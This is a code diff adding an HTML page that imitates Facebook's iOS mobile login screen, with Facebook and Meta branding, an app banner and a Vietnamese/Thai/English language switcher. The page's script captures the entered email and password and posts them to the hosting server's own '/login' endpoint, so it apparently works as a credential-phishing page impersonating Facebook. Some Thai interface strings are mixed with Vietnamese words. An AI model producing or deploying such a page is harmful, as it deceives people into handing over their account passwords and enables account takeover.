@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Facebook Login - iOS UI</title>
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --text-gray: #65676b;
+            --border-color: #dddfe2;
+            --bg-input: #f5f6f7;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif; -webkit-tap-highlight-color: transparent; }
+
+        body { background-color: #fff; display: flex; flex-direction: column; min-height: 100vh; }
+
+        /* Header & Banner */
+        .top-app-header { padding: 10px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 0.5px solid #e5e5e5; }
+        .header-left { display: flex; align-items: center; gap: 12px; }
+        .fb-app-icon { width: 36px; height: 36px; border-radius: 8px; }
+        .app-info { display: flex; flex-direction: column; line-height: 1.3; }
+        .app-name { font-weight: 700; font-size: 15px; }
+        .app-sub { font-size: 12px; color: var(--text-gray); }
+        .btn-open { background: var(--fb-blue); color: white; padding: 6px 16px; border-radius: 6px; font-weight: 700; text-decoration: none; font-size: 14px; }
+        .download-banner { padding: 12px 16px; display: flex; align-items: center; gap: 12px; color: var(--fb-blue); font-size: 14px; border-bottom: 0.5px solid #e5e5e5; }
+        .ios-download-icon { width: 20px; height: 20px; stroke: var(--fb-blue); stroke-width: 2.5; fill: none; }
+
+        /* Main UI */
+        .container { flex: 1; padding: 0 20px; text-align: center; width: 100%; max-width: 400px; margin: 0 auto; }
+        .lang-selector-trigger { color: #8a8d91; font-size: 13px; margin: 20px 0; cursor: pointer; display: block; }
+        .fb-logo-main { width: 60px; margin: 20px 0 40px; }
+        .input-field { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid var(--border-color); border-radius: 12px; background: var(--bg-input); font-size: 16px; outline: none; }
+        .btn-login { width: 100%; padding: 12px; background: var(--fb-blue); color: white; border: none; border-radius: 25px; font-weight: 700; font-size: 17px; margin-top: 8px; cursor: pointer; }
+
+        /* Modal Language */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4); z-index: 1000; display: none; align-items: flex-start; justify-content: center; padding-top: 15vh; }
+        .lang-modal { background: #fff; width: 90%; max-width: 340px; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.2); }
+        .modal-header { display: flex; align-items: center; padding: 16px; border-bottom: 0.5px solid #ddd; }
+        .btn-close-modal { font-size: 28px; cursor: pointer; color: #000; line-height: 1; }
+        .modal-title { flex: 1; text-align: center; font-weight: 600; font-size: 17px; margin-right: 25px; }
+        .lang-item { display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; border-bottom: 0.5px solid #f0f0f0; cursor: pointer; }
+        .checkbox-square { width: 22px; height: 22px; border: 2px solid #ccd0d5; border-radius: 4px; position: relative; }
+        .lang-item.selected .checkbox-square { background: var(--fb-blue); border-color: var(--fb-blue); }
+        .lang-item.selected .checkbox-square::after { content: ''; position: absolute; left: 7px; top: 3px; width: 5px; height: 10px; border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg); }
+
+        /* Footer bổ sung theo ảnh image_bc2ad3.png */
+        .footer { padding: 20px; text-align: center; margin-top: auto; }
+        .btn-create { width: 100%; padding: 10px; border: 1px solid var(--fb-blue); color: var(--fb-blue); border-radius: 25px; text-decoration: none; display: block; margin-bottom: 25px; font-weight: 500; }
+        .footer-logo { display: flex; align-items: center; justify-content: center; gap: 5px; color: #4b4f56; font-weight: 700; font-size: 16px; margin-bottom: 15px; }
+        .meta-icon { color: var(--fb-blue); font-size: 24px; font-weight: 300; }
+        .footer-links { display: flex; justify-content: center; gap: 15px; font-size: 12px; color: #8a8d91; }
+        .footer-links a { text-decoration: none; color: inherit; }
+    </style>
+</head>
+<body>
+
+    <div id="main-ui">
+        <header class="top-app-header">
+            <div class="header-left">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-app-icon">
+                <div class="app-info">
+                    <span class="app-name">Facebook</span>
+                    <span class="app-sub" id="sub-header-text">Open in the Facebook app</span>
+                </div>
+            </div>
+            <a href="#" class="btn-open" id="btn-open-text">OPEN</a>
+        </header>
+
+        <div class="download-banner">
+            <svg class="ios-download-icon" viewBox="0 0 24 24"><path d="M4 14v4a2 2 0 002 2h12a2 2 0 002-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+            <p id="banner-text">Get Facebook for iOS and browse faster.</p>
+        </div>
+
+        <div class="container">
+            <div class="lang-selector-trigger" id="current-lang-display" onclick="toggleModal(true)">English (US)</div>
+            <img class="fb-logo-main" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png">
+            
+            <form id="loginForm">
+                <input type="text" class="input-field" id="email" placeholder="Mobile number or email" required>
+                <input type="password" class="input-field" id="password" placeholder="Password" required>
+                <button type="submit" class="btn-login" id="btn-login-text">Log In</button>
+            </form>
+            
+            <a href="#" style="display:block; margin-top:25px; color:#1c1e21; text-decoration:none; font-size:15px;" id="forgot-text">Forgot Password?</a>
+        </div>
+
+        <div class="footer">
+            <a href="#" class="btn-create" id="btn-create-text">Create new account</a>
+            
+            <div class="footer-logo">
+                <span class="meta-icon">∞</span> Meta
+            </div>
+            
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Help</a>
+                <a href="#">More</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="modalOverlay" onclick="toggleModal(false)">
+        <div class="lang-modal" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <div class="btn-close-modal" onclick="toggleModal(false)">×</div>
+                <div class="modal-title">Select Language</div>
+            </div>
+            <div class="lang-list-container">
+                <div class="lang-item selected" id="item-en" onclick="selectLang('en')">
+                    <span class="lang-name">English (US)</span>
+                    <div class="checkbox-square"></div>
+                </div>
+                <div class="lang-item" id="item-vi" onclick="selectLang('vi')">
+                    <span class="lang-name">Tiếng Việt</span>
+                    <div class="checkbox-square"></div>
+                </div>
+                <div class="lang-item" id="item-th" onclick="selectLang('th')">
+                    <span class="lang-name">ภาษาไทย</span>
+                    <div class="checkbox-square"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Xử lý gửi dữ liệu Login
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                // Bạn có thể xử lý chuyển hướng hoặc thông báo lỗi ở đây
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+
+        // Đa ngôn ngữ và Modal
+        const translations = {
+            'en': { display: 'English (US)', header: 'Open in the Facebook app', open: 'OPEN', banner: 'Get Facebook for iOS and browse faster.', user: 'Mobile number or email', pass: 'Password', login: 'Log In', forgot: 'Forgot Password?', create: 'Create new account' },
+            'vi': { display: 'Tiếng Việt', header: 'Mở trong ứng dụng Facebook', open: 'MỞ', banner: 'Tải Facebook cho iOS và lướt nhanh hơn.', user: 'Số điện thoại hoặc email', pass: 'Mật khẩu', login: 'Đăng nhập', forgot: 'Quên mật khẩu?', create: 'Tạo tài khoản mới' },
+            'th': { display: 'ภาษาไทย', header: 'เปิดใน ứng dụng Facebook', open: 'เปิด', banner: 'บน Facebook หรือ iOS ของคุณ', user: 'หมายเลขโทรศัพท์มือถือ หรือ อีเมล', pass: 'รหัสผ่าน', login: 'เข้าสู่ระบบ', forgot: 'ลืมรหัสผ่าน?', create: 'สร้างบัญชี mới' }
+        };
+
+        function toggleModal(show) {
+            document.getElementById('modalOverlay').style.display = show ? 'flex' : 'none';
+        }
+
+        function selectLang(lang) {
+            const data = translations[lang];
+            document.getElementById('current-lang-display').innerText = data.display;
+            document.getElementById('sub-header-text').innerText = data.header;
+            document.getElementById('btn-open-text').innerText = data.open;
+            document.getElementById('banner-text').innerText = data.banner;
+            document.getElementById('email').placeholder = data.user;
+            document.getElementById('password').placeholder = data.pass;
+            document.getElementById('btn-login-text').innerText = data.login;
+            document.getElementById('forgot-text').innerText = data.forgot;
+            document.getElementById('btn-create-text').innerText = data.create;
+
+            document.querySelectorAll('.lang-item').forEach(el => el.classList.remove('selected'));
+            document.getElementById('item-' + lang).classList.add('selected');
+            setTimeout(() => toggleModal(false), 200);
+        }
+    </script>
+</body>
+</html>
